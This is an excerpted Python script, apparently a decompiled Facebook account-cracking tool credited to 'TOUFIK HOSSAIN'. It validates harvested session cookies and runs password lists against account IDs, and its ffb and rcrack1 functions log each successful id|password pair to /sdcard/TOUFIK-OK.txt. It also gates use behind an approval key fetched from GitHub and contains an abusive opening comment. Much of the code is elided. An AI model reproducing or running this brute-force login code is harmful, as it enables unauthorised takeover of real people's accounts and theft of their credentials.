#assalamowalikom OPEN source by (TOUFIK HOSSAIN )
#Fuck YATEEM kid TOUFIK HOSSAIN
...
android_models=[]
try:
	xx = requests.get('https://github.com/HHH292/ap/blob/main/ap').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://github.com/HHH292/ap/blob/main/ap').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/HHH292/ap/blob/main/ap').text
		ua=open('.bbnew.txt','w')
...
\033[1;93m--------------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m TOUFIK HOSSAIN
\033[1;37m[-] GITHUB    :\033[1;32m TESTOURX
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/TOUFIK.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/TOUFIK.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/TOUFIK\033[0;97m')
...
def login():
    ...
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://p.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","referer": "https://p.facebook.com/","host": "p.facebook.com","origin": "https://p.facebook.com","upgrade-insecure-requests" : "1","accept-language': 'en-US,en;q=0.9","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://wa.me/+8801568579466');menu()
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [TOUFIK] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [TOUFIK-OK] %s | %s'%(ids,pas))
				open('/sdcard/TOUFIK-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [TOUFIK-CP] '+ids+' | '+pas+'\033[1;97m')
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [TOUFIK-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/TOUFIK-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [TOUFIK-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [TOUFIK-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/testourx/T-X/main/Approvalb2.txt').text
...
\033[1;37m[-] AUTHOR    :\033[1;32m TOUFIK HOSSAIN
\033[1;37m[-] GITHUB    :\033[1;32m TESTOURX
\033[1;37m[-] WhatsApp  :\033[1;32m +8801322342876 
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/HHH292/ap/blob/main/ap").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/HHH292/ap/blob/main/ap').text
